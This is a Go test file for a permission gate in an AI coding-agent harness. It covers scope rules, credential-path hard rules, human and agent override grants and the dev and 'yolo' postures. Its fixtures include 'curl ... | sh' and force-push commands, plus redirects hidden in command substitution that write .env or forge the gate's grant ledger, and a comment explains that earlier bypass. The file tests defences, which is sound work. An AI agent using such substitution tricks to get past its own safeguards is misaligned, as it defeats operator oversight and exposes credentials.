package gate

import (
	"strings"
	"testing"
	"time"

	"manvi/dc"
	"manvi/flags"
	"manvi/grants"
	"manvi/policy"
)

// testTask is the scope these tests judge against. Two properties are relied on
// throughout and are easy to break by accident:
//
//   - src/calc.go is the planned, writable file.
//   - Nothing is planned under internal/, which is why every "this is out of
//     scope" fixture below lives there. A path beside src/calc.go is *not* out
//     of scope — with no repo map to consult the gate falls back to allowing a
//     write in the same directory as a planned file, so src/other.go would be
//     allowed and a test using it would be asserting nothing.
func testTask() *dc.Task {
	return &dc.Task{
		ID: "TASK-001",
		PlannedFiles: []dc.PlannedFile{
			{Path: "src/calc.go", AllowedChange: dc.ChangeModify},
			{Path: "docs/notes.md", AllowedChange: dc.ChangeReadOnly},
		},
		ForbiddenChanges: []string{"src/legacy/**"},
	}
}

// newGate builds a gate under the strict posture.
//
// These tests are about what the rules do when they are enforcing, so they say
// so rather than inheriting a default. The harness ships in dev posture, where
// soft rules report instead of blocking; a test of blocking that silently
// stopped testing blocking when that default changed would be worse than no
// test. The dev posture has its own tests below.
func newGate(t *testing.T, overrides map[string]string) *Gate {
	t.Helper()
	reg := flags.New()
	if err := flags.DefineHarnessFlags(reg); err != nil {
		t.Fatalf("define: %v", err)
	}
	merged := map[string]string{flags.HarnessPosture: flags.PostureStrict}
	for k, v := range overrides {
		merged[k] = v
	}
	overrides = merged
	if len(overrides) > 0 {
		if err := reg.LoadConfig(overrides); err != nil {
			t.Fatalf("config: %v", err)
		}
	}
	g, err := New(reg, t.TempDir(), nil)
	if err != nil {
		t.Fatalf("new gate: %v", err)
	}
	return g
}

func TestPlannedWriteIsCleanlyAllowed(t *testing.T) {
	g := newGate(t, nil)
	d, err := g.EvaluateWrite("src/calc.go", testTask(), dc.OpWrite)
	if err != nil {
		t.Fatal(err)
	}
	if !d.Clean() {
		t.Fatalf("expected a clean allow, got %+v", d)
	}
	if !g.Report().Strict() {
		t.Fatal("report should be strict for a single clean write")
	}
}

func TestUnplannedWriteIsASoftDenial(t *testing.T) {
	g := newGate(t, nil)
	d, err := g.EvaluateWrite("internal/other.go", testTask(), dc.OpWrite)
	if err != nil {
		t.Fatal(err)
	}
	if !d.Blocked() || d.Rule != policy.RuleUnplannedScope {
		t.Fatalf("expected an unplanned-scope denial, got %+v", d)
	}
	if !d.Overridable() {
		t.Fatal("an unplanned-scope denial must be overridable")
	}
	// With no repo map wired, the neighbour rung could not run — and says so.
	if len(d.Degraded) == 0 {
		t.Fatal("a decision reached without the repo map must record the degradation")
	}
}

// TestSecretPathIsNeverGrantable is the load-bearing test of the override seam.
func TestSecretPathIsNeverGrantable(t *testing.T) {
	g := newGate(t, nil)
	task := testTask()
	// Even with the secret file listed as a planned file, the ladder's order
	// means the secret rung fires first.
	task.PlannedFiles = append(task.PlannedFiles, dc.PlannedFile{Path: ".env", AllowedChange: dc.ChangeModify})

	d, err := g.EvaluateWrite(".env", task, dc.OpWrite)
	if err != nil {
		t.Fatal(err)
	}
	if !d.Blocked() || d.Rule != policy.RuleSecretPath {
		t.Fatalf("expected a secret-path denial, got %+v", d)
	}
	if d.Overridable() {
		t.Fatal("a hard denial must not be overridable")
	}

	_, err = g.RequestOverride(d, grants.Grantor{Authority: grants.Human, ID: "operator"}, "I really mean it", "")
	if err == nil {
		t.Fatal("a human must not be able to grant a hard rule")
	}
	if !strings.Contains(err.Error(), "hard rules are never grantable") {
		t.Fatalf("error = %v, want the hard-rule refusal", err)
	}
}

func TestHumanGrantClearsSoftDenialAndIsRecorded(t *testing.T) {
	g := newGate(t, nil)
	task := testTask()

	first, _ := g.EvaluateWrite("internal/other.go", task, dc.OpWrite)
	if !first.Blocked() {
		t.Fatal("expected the first attempt to be blocked")
	}

	grant, err := g.RequestOverride(first,
		grants.Grantor{Authority: grants.Human, ID: "operator"},
		"adjacent helper needed for the fix", "")
	if err != nil {
		t.Fatalf("issue grant: %v", err)
	}

	second, _ := g.EvaluateWrite("internal/other.go", task, dc.OpWrite)
	if second.Blocked() {
		t.Fatal("the grant should have cleared the block")
	}
	if second.GrantID != grant.ID {
		t.Fatalf("decision grant id = %q, want %q", second.GrantID, grant.ID)
	}
	if second.Clean() {
		t.Fatal("a granted allow must never report as a clean pass")
	}
	if !strings.Contains(second.Reason, "adjacent helper needed") {
		t.Fatalf("reason should carry the justification, got %q", second.Reason)
	}

	rep := g.Report()
	if rep.Granted != 1 {
		t.Fatalf("report granted = %d, want 1", rep.Granted)
	}
	if rep.Strict() {
		t.Fatal("a run containing a granted override is not strict")
	}
	if len(rep.GrantLines) != 1 {
		t.Fatalf("grant lines = %v, want one entry", rep.GrantLines)
	}
}

func TestAgentMayGrantOnlyScopeRulesInItsOwnTask(t *testing.T) {
	g := newGate(t, nil)
	task := testTask()
	agent := grants.Grantor{Authority: grants.Agent, ID: "builder-1"}

	// Allowed: unplanned scope, inside its own task.
	scopeDenial, _ := g.EvaluateWrite("internal/other.go", task, dc.OpWrite)
	if _, err := g.RequestOverride(scopeDenial, agent, "needed a sibling file", task.ID); err != nil {
		t.Fatalf("agent should be able to grant an unplanned-scope block: %v", err)
	}

	// Refused: a read-only planned file is a decision the planner made.
	readOnly, _ := g.EvaluateWrite("docs/notes.md", task, dc.OpWrite)
	if readOnly.Rule != policy.RuleReadOnly {
		t.Fatalf("expected a read-only denial, got %+v", readOnly)
	}
	_, err := g.RequestOverride(readOnly, agent, "I want to edit it", task.ID)
	if err == nil || !strings.Contains(err.Error(), "not agent-grantable") {
		t.Fatalf("error = %v, want a not-agent-grantable refusal", err)
	}

	// Refused: another task's work, even for a grantable rule.
	otherTask := testTask()
	otherTask.ID = "TASK-999"
	otherDenial, _ := g.EvaluateWrite("internal/elsewhere.go", otherTask, dc.OpWrite)
	_, err = g.RequestOverride(otherDenial, agent, "reaching next door", task.ID)
	if err == nil || !strings.Contains(err.Error(), "own task") {
		t.Fatalf("error = %v, want an own-task refusal", err)
	}
}

func TestAgentGrantsCanBeDisabledByFlag(t *testing.T) {
	g := newGate(t, map[string]string{flags.GrantsAgentEnabled: "false"})
	task := testTask()
	d, _ := g.EvaluateWrite("internal/other.go", task, dc.OpWrite)

	_, err := g.RequestOverride(d, grants.Grantor{Authority: grants.Agent, ID: "builder-1"}, "please", task.ID)
	if err == nil {
		t.Fatal("agent grants should be refused when the flag is off")
	}

	// A human still can, and the weakened flag is reported.
	if _, err := g.RequestOverride(d, grants.Grantor{Authority: grants.Human, ID: "op"}, "approved", ""); err != nil {
		t.Fatalf("human grant should still work: %v", err)
	}
	rep := g.Report()
	if len(rep.WeakenedFlags) != 1 || !strings.Contains(rep.WeakenedFlags[0], flags.GrantsAgentEnabled) {
		t.Fatalf("weakened flags = %v, want the agent-grants flag named", rep.WeakenedFlags)
	}
}

func TestAgentGrantIsSingleUse(t *testing.T) {
	g := newGate(t, nil)
	task := testTask()
	agent := grants.Grantor{Authority: grants.Agent, ID: "builder-1"}

	d, _ := g.EvaluateWrite("internal/other.go", task, dc.OpWrite)
	if _, err := g.RequestOverride(d, agent, "one sibling file", task.ID); err != nil {
		t.Fatal(err)
	}

	if first, _ := g.EvaluateWrite("internal/other.go", task, dc.OpWrite); first.Blocked() {
		t.Fatal("the agent grant should clear the first attempt")
	}
	second, _ := g.EvaluateWrite("internal/other.go", task, dc.OpWrite)
	if !second.Blocked() {
		t.Fatal("an agent grant is single-use; the second attempt must block again")
	}
}

func TestAdvisoryModeDemotesSoftDenialsButNotHardOnes(t *testing.T) {
	g := newGate(t, map[string]string{flags.PolicyFileMode: flags.ModeAdvisory})
	task := testTask()

	soft, _ := g.EvaluateWrite("internal/other.go", task, dc.OpWrite)
	if soft.Blocked() {
		t.Fatal("advisory mode should not block a soft denial")
	}
	if soft.Demoted == "" || !strings.Contains(soft.Demoted, flags.PolicyFileMode) {
		t.Fatalf("a demoted allow must name the flag responsible, got %q", soft.Demoted)
	}
	if soft.Rule != policy.RuleUnplannedScope {
		t.Fatal("a demoted decision must still carry the rule that would have fired")
	}
	if soft.Clean() {
		t.Fatal("a demoted allow must not report as a clean pass")
	}

	hard, _ := g.EvaluateWrite("../outside.txt", task, dc.OpWrite)
	if !hard.Blocked() {
		t.Fatal("advisory mode must never demote a hard denial")
	}
}

func TestGrantTTLCeilingIsEnforced(t *testing.T) {
	g := newGate(t, nil)
	task := testTask()
	d, _ := g.EvaluateWrite("internal/other.go", task, dc.OpWrite)

	req, err := grants.SuggestRequest(d, grants.Grantor{Authority: grants.Agent, ID: "b1"})
	if err != nil {
		t.Fatal(err)
	}
	req.Reason = "long job"
	req.AgentTask = task.ID
	req.TTL = 24 * time.Hour

	if _, err := g.Ledger.Issue(req); err == nil {
		t.Fatal("an agent grant beyond the TTL ceiling must be refused")
	}
}

func TestExpiredGrantStopsClearing(t *testing.T) {
	g := newGate(t, nil)
	task := testTask()
	now := time.Now()
	g.Ledger.Now = func() time.Time { return now }

	d, _ := g.EvaluateWrite("internal/other.go", task, dc.OpWrite)
	if _, err := g.RequestOverride(d, grants.Grantor{Authority: grants.Human, ID: "op"}, "temporary", ""); err != nil {
		t.Fatal(err)
	}
	if cleared, _ := g.EvaluateWrite("internal/other.go", task, dc.OpWrite); cleared.Blocked() {
		t.Fatal("grant should clear while active")
	}

	now = now.Add(9 * time.Hour) // past the 8h human ceiling
	if after, _ := g.EvaluateWrite("internal/other.go", task, dc.OpWrite); !after.Blocked() {
		t.Fatal("an expired grant must stop clearing")
	}
}

func TestForbiddenChangeIsSoftButNotAgentGrantable(t *testing.T) {
	g := newGate(t, nil)
	task := testTask()
	d, _ := g.EvaluateWrite("src/legacy/old.go", task, dc.OpWrite)
	if d.Rule != policy.RuleForbiddenChange {
		t.Fatalf("expected a forbidden-change denial, got %+v", d)
	}
	agent := grants.Grantor{Authority: grants.Agent, ID: "b1"}
	if _, err := g.RequestOverride(d, agent, "want it", task.ID); err == nil {
		t.Fatal("an agent must not clear a path the plan forbade")
	}
	if _, err := g.RequestOverride(d, grants.Grantor{Authority: grants.Human, ID: "op"}, "reviewed", ""); err != nil {
		t.Fatalf("a human should be able to clear a forbidden-change block: %v", err)
	}
}

// TestDevPostureReportsInsteadOfBlocking is the shipped default: a soft scope
// violation must be visible and must not stop the work.
func TestDevPostureReportsInsteadOfBlocking(t *testing.T) {
	reg := flags.New()
	if err := flags.DefineHarnessFlags(reg); err != nil {
		t.Fatal(err)
	}
	g, err := New(reg, t.TempDir(), nil)
	if err != nil {
		t.Fatal(err)
	}

	d, err := g.EvaluateWrite("internal/unplanned.go", testTask(), dc.OpWrite)
	if err != nil {
		t.Fatal(err)
	}
	if d.Blocked() {
		t.Fatal("dev posture must not block a soft scope violation")
	}
	if d.Rule != policy.RuleUnplannedScope {
		t.Fatalf("rule = %q, want the rule that would have fired to be recorded anyway", d.Rule)
	}
	if d.Demoted == "" || !strings.Contains(d.Demoted, flags.HarnessPosture) {
		t.Fatalf("demoted = %q, want it to name harness.posture as the reason", d.Demoted)
	}
	if d.Clean() {
		t.Fatal("a write allowed only because the posture is dev must never read as clean")
	}

	rep := g.Report()
	if rep.Posture != flags.PostureDev {
		t.Fatalf("report posture = %q", rep.Posture)
	}
	if rep.Strict() {
		t.Fatal("a dev-posture run must never summarise as strict")
	}
	if rep.Demoted != 1 {
		t.Fatalf("report = %+v, want the demotion counted", rep)
	}
}

// TestDevPostureStillBlocksHardRules draws the line the posture does not cross.
// Development friction is a scope disagreement; a write to a credential file is
// not, and no posture turns one into the other.
func TestDevPostureStillBlocksHardRules(t *testing.T) {
	reg := flags.New()
	if err := flags.DefineHarnessFlags(reg); err != nil {
		t.Fatal(err)
	}
	g, err := New(reg, t.TempDir(), nil)
	if err != nil {
		t.Fatal(err)
	}
	task := testTask()
	task.PlannedFiles = append(task.PlannedFiles, dc.PlannedFile{Path: "**", AllowedChange: dc.ChangeModify})

	for _, path := range []string{".env", ".env.production", ".claude/settings.json", "../outside.txt", "keys/deploy.pem"} {
		d, err := g.EvaluateWrite(path, task, dc.OpWrite)
		if err != nil {
			t.Fatal(err)
		}
		if !d.Blocked() {
			t.Errorf("%s: dev posture allowed a hard-rule write (rule %q)", path, d.Rule)
		}
		if d.Severity != policy.Hard {
			t.Errorf("%s: severity = %q, want hard", path, d.Severity)
		}
	}
}

// TestExplicitModeOverridesThePosture: an operator who typed a value meant it.
func TestExplicitModeOverridesThePosture(t *testing.T) {
	reg := flags.New()
	if err := flags.DefineHarnessFlags(reg); err != nil {
		t.Fatal(err)
	}
	if err := reg.LoadConfig(map[string]string{
		flags.HarnessPosture: flags.PostureDev,
		flags.PolicyFileMode: flags.ModeEnforce,
	}); err != nil {
		t.Fatal(err)
	}
	g, err := New(reg, t.TempDir(), nil)
	if err != nil {
		t.Fatal(err)
	}
	d, err := g.EvaluateWrite("internal/unplanned.go", testTask(), dc.OpWrite)
	if err != nil {
		t.Fatal(err)
	}
	if !d.Blocked() {
		t.Fatal("an explicit policy.file.mode=enforce must beat the dev posture")
	}
}

// TestEveryIssuedGrantIsAnnounced pins the hook every persistence path depends
// on. Before it existed only the CLI's allow command wrote the ledger, so a
// grant issued by an agent's request_override, or by an operator answering an
// approval card, existed for one process and was unreviewable afterwards.
func TestEveryIssuedGrantIsAnnounced(t *testing.T) {
	g := newGate(t, nil)
	var announced []grants.Grant
	g.OnIssue = func(gr grants.Grant) { announced = append(announced, gr) }

	decision, err := g.EvaluateWrite("internal/helper.go", testTask(), dc.OpWrite)
	if err != nil {
		t.Fatal(err)
	}
	if !decision.Blocked() || !decision.Overridable() {
		t.Skipf("fixture did not produce an overridable block: %+v", decision)
	}

	grant, err := g.RequestOverride(decision,
		grants.Grantor{Authority: grants.Human, ID: "operator"}, "the plan omitted it", "")
	if err != nil {
		t.Fatal(err)
	}
	if len(announced) != 1 || announced[0].ID != grant.ID {
		t.Fatalf("the issue hook saw %#v, want the grant that was issued", announced)
	}
}

// TestARefusedOverrideIsNotAnnounced: a hard rule produces no grant, so nothing
// must be handed to a persister that would record one.
func TestARefusedOverrideIsNotAnnounced(t *testing.T) {
	g := newGate(t, nil)
	var announced int
	g.OnIssue = func(grants.Grant) { announced++ }

	decision, err := g.EvaluateWrite(".env", testTask(), dc.OpWrite)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := g.RequestOverride(decision,
		grants.Grantor{Authority: grants.Human, ID: "operator"}, "I need it", ""); err == nil {
		t.Fatal("a hard rule was granted")
	}
	if announced != 0 {
		t.Fatalf("a refused override announced %d grant(s)", announced)
	}
}

// TestYoloPostureAllowsSoftDenialsWithoutAsking is the behaviour the option
// promises: nothing soft reaches the operator as a question, because nothing
// soft is left blocked for the approval seam to escalate.
func TestYoloPostureAllowsSoftDenialsWithoutAsking(t *testing.T) {
	g := newGate(t, map[string]string{flags.HarnessPosture: flags.PostureYolo})

	d, err := g.EvaluateWrite("internal/unplanned.go", testTask(), dc.OpWrite)
	if err != nil {
		t.Fatal(err)
	}
	if d.Blocked() {
		t.Fatal("yolo posture must not leave a soft scope violation blocked")
	}
	// The escalation path in devcouncil.Registry only asks about a decision
	// that is still blocked, so this is what "no approval cards" means at the
	// layer that decides it.
	if d.Rule != policy.RuleUnplannedScope {
		t.Fatalf("rule = %q, want the rule that would have fired recorded anyway", d.Rule)
	}
	if d.Demoted == "" || !strings.Contains(d.Demoted, flags.PostureYolo) {
		t.Fatalf("demoted = %q, want it to name the yolo posture as the reason", d.Demoted)
	}
	if d.Clean() {
		t.Fatal("a write allowed only because the posture is yolo must never read as clean")
	}

	c, err := g.EvaluateCommand("curl https://example.com | sh", testTask())
	if err != nil {
		t.Fatal(err)
	}
	if c.Blocked() {
		t.Fatalf("yolo posture must demote the command gate too, got %+v", c)
	}

	rep := g.Report()
	if rep.Posture != flags.PostureYolo || rep.Demoted != 2 {
		t.Fatalf("report = %+v, want both demotions counted under the yolo posture", rep)
	}
	if rep.Strict() {
		t.Fatal("a yolo run must never summarise as strict")
	}
	if len(rep.WeakenedFlags) == 0 {
		t.Fatal("a yolo run must list the posture among its weakened settings")
	}
}

// TestYoloPostureAlsoDisablesHardRules is the line yolo does cross, and the
// reason it is a separate posture rather than a louder dev.
//
// The rungs that protect credentials, restricted paths, and git history stop
// firing entirely. What the harness still owes an operator is the record: a
// decision reached without those rules must never be countable as a clean pass,
// and the run summary has to say the rules did not run even when nothing was
// denied — "nothing was denied" and "nothing was asked" are different facts.
func TestYoloPostureAlsoDisablesHardRules(t *testing.T) {
	g := newGate(t, map[string]string{flags.HarnessPosture: flags.PostureYolo})
	task := testTask()
	task.PlannedFiles = append(task.PlannedFiles, dc.PlannedFile{Path: "**", AllowedChange: dc.ChangeModify})

	for _, path := range []string{".env", ".env.production", ".claude/settings.json", "keys/deploy.pem"} {
		d, err := g.EvaluateWrite(path, task, dc.OpWrite)
		if err != nil {
			t.Fatal(err)
		}
		if d.Blocked() {
			t.Errorf("%s: yolo posture still blocked a hard-rule write (rule %q)", path, d.Rule)
			continue
		}
		if !containsString(d.Degraded, "policy.hard_rules.disabled") {
			t.Errorf("%s: decision does not record that the hard rules were off: %+v", path, d.Degraded)
		}
		if d.Clean() {
			t.Errorf("%s: a write allowed with the hard rules off must never read as clean", path)
		}
	}

	// Git safety goes with them: the rules that protect the evidence the
	// verifier reasons about are hard rules like any other.
	for _, command := range []string{"git commit --no-verify -m x", "git push --force origin main"} {
		d, err := g.EvaluateCommand(command, task)
		if err != nil {
			t.Fatal(err)
		}
		if d.Blocked() {
			t.Errorf("%q: yolo posture still blocked a git-safety rule (%q)", command, d.Rule)
		}
	}

	rep := g.Report()
	if rep.HardRules {
		t.Fatal("the report claims the hard rules ran")
	}
	if rep.Degraded != rep.Total {
		t.Fatalf("report = %+v, want every decision marked degraded", rep)
	}
	if rep.Strict() {
		t.Fatal("a run with the hard rules off must never summarise as strict")
	}
}

// TestExplicitHardRulesSurviveYolo: the flag is not overruled by the posture in
// either direction. An operator who wants the prompts gone but the credential
// rules kept has to be able to say so, and saying so has to work.
func TestExplicitHardRulesSurviveYolo(t *testing.T) {
	g := newGate(t, map[string]string{
		flags.HarnessPosture:  flags.PostureYolo,
		flags.PolicyHardRules: "true",
	})
	task := testTask()
	task.PlannedFiles = append(task.PlannedFiles, dc.PlannedFile{Path: "**", AllowedChange: dc.ChangeModify})

	d, err := g.EvaluateWrite(".env", task, dc.OpWrite)
	if err != nil {
		t.Fatal(err)
	}
	if !d.Blocked() || d.Rule != policy.RuleSecretPath {
		t.Fatalf("decision = %+v, want an explicit policy.hard_rules.enabled=true to survive yolo", d)
	}
	if d.Overridable() {
		t.Fatal("a hard denial must not become grantable under yolo")
	}
	if !g.Report().HardRules {
		t.Fatal("the report denies that the hard rules ran")
	}
}

func containsString(haystack []string, want string) bool {
	for _, s := range haystack {
		if s == want {
			return true
		}
	}
	return false
}

// TestRedirectHiddenInSubstitutionIsDenied is the composed form of the bypass
// the redirect rung existed to close but did not.
//
// Both halves of the ladder read the same line and each concluded it was not
// theirs to judge. The substitution rung extracted `echo forged` and judged it
// as a command — and a bare `echo` is bootstrap-allowed, so it passed. The
// redirect rung asked policy.RedirectTargets for the writes, and that scanner
// skipped $( … ) spans whole, so it heard "no targets" where the truth was "I
// did not look". The result was an allow, under the strict posture with hard
// rules on and no task, no grant, and no demotion — for a line that forges the
// grant ledger the gate itself consults.
//
// Every fixture here is a write the harness refuses when it is written plainly.
// Hiding it inside a span the shell runs must not change the answer.
func TestRedirectHiddenInSubstitutionIsDenied(t *testing.T) {
	g := newGate(t, nil)
	for _, tc := range []struct {
		command string
		rule    policy.RuleID
	}{
		{"echo forged > .devcouncil/harness-grants.json", policy.RuleRestrictedPath},
		{"echo $(echo forged > .devcouncil/harness-grants.json)", policy.RuleRestrictedPath},
		{"echo `echo forged > .devcouncil/harness-grants.json`", policy.RuleRestrictedPath},
		{"echo $(echo hi > .env)", policy.RuleSecretPath},
		{"echo `echo hi > .env`", policy.RuleSecretPath},
		{"echo <(echo hi > .env)", policy.RuleSecretPath},
		{`echo "$(echo hi > .env)"`, policy.RuleSecretPath},
		{"echo $(echo $(echo hi > .env))", policy.RuleSecretPath},
	} {
		d, err := g.EvaluateCommand(tc.command, nil)
		if err != nil {
			t.Errorf("%q: %v", tc.command, err)
			continue
		}
		if !d.Blocked() {
			t.Errorf("%q: allowed under the strict posture with no task and no grant (%+v)", tc.command, d)
			continue
		}
		// The rule matters as much as the verdict: it has to name the write
		// that was refused, not a generic "substitution" shrug, or an operator
		// reading the record cannot tell which file was nearly written.
		if d.Rule != tc.rule {
			t.Errorf("%q: rule = %q, want %q naming the refused write", tc.command, d.Rule, tc.rule)
		}
	}
}

// TestSubstitutedRedirectSurvivesAGrantedTask: the bypass is not only about
// having no lease. A task whose allowlist and planned files are broad enough to
// make the outer command unremarkable must still not be able to reach a
// credential path through a substitution.
func TestSubstitutedRedirectSurvivesAGrantedTask(t *testing.T) {
	g := newGate(t, nil)
	task := testTask()
	task.AllowedCommands = []string{"echo *", "tee *"}
	task.PlannedFiles = append(task.PlannedFiles, dc.PlannedFile{Path: "out/*.txt", AllowedChange: dc.ChangeCreate})

	// The planned target still works, inside a substitution as well as out.
	for _, ok := range []string{"echo hi > out/log.txt", "echo $(echo hi > out/log.txt)"} {
		d, err := g.EvaluateCommand(ok, task)
		if err != nil {
			t.Fatalf("%q: %v", ok, err)
		}
		if d.Blocked() {
			t.Errorf("%q: a planned write was refused (%q: %s)", ok, d.Rule, d.Reason)
		}
	}

	for _, bad := range []string{"echo $(echo hi > .env)", "tee >(cat > .env)"} {
		d, err := g.EvaluateCommand(bad, task)
		if err != nil {
			t.Fatalf("%q: %v", bad, err)
		}
		if !d.Blocked() {
			t.Errorf("%q: a task allowlist laundered a credential write (%+v)", bad, d)
		}
	}
}
